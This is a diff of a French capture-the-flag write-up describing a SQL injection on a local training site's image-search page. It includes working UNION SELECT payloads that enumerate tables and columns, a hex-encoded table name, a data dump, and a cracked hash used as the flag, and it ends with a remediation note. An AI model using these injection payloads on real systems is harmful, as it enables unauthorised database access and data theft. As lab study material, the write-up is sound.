@@ -15,9 +15,9 @@ FAILLE SUR LA PAGE SEARCH IMAGE
 - J'ai ensuite fait: http://localhost:8080/index.php?page=searchimg&id=4 UNION SELECT 1,GROUP_CONCAT(table_name) FROM information_schema.tables WHERE table_schema=database()
     => ceci permet de lister les tables ce qui me retourne: list_images 
     => qui est le nom de la table
-- J'ai ensuite testé: http://localhost:8080/index.php?page=searchimg&id=-1 UNIONSELECT1,GROUP_CONCAT(column_name) FROM information_schema.columns WHERE table_name=list_images&Submit=Submit#
-    => cette commande liste toutes les colonnes de la table mais ca ne rennvoie rien
-    => il faut refaire la commande mais en mettant list_images en héxadécimal
+- J'ai ensuite testé: http://localhost:8080/index.php?page=searchimg&id=-1 UNION SELECT 1,GROUP_CONCAT(column_name) FROM information_schema.columns WHERE table_name=list_images&Submit=Submit#
+    => cette commande liste toutes les colonnes de la table mais ca ne renvoie rien
+    => il faut refaire la commande mais en mettant list_images en hexadécimal
 - La commande est donc: http://localhost:8080/index.php?page=searchimg&id=-1%20UNION%20SELECT%201,GROUP_CONCAT(column_name)%20FROM%20information_schema.columns%20WHERE%20table_name=0x6c6973745f696d61676573&Submit=Submit#
     => ceci me retourne des colonnes: id,url,title,comment
 - Pour lire les tables je colonnes: UNION SELECT url,comment FROM list_images
@@ -25,3 +25,7 @@ FAILLE SUR LA PAGE SEARCH IMAGE
     C'EST LE FLAG
 - Donc j'utilise un md5 decode et le résultat est: albatroz
     - Ensuite le résultat est f2a29020ef3132e01dd61df97fd33ec8d7fcd1388cc9601e7db691d17d4d6188 quand j'encode en sha256
+
+RESOLUTION FAILLE
+
+- Proteger contre les failles SQL, utiliser un ORM qui integre la gestion de failles
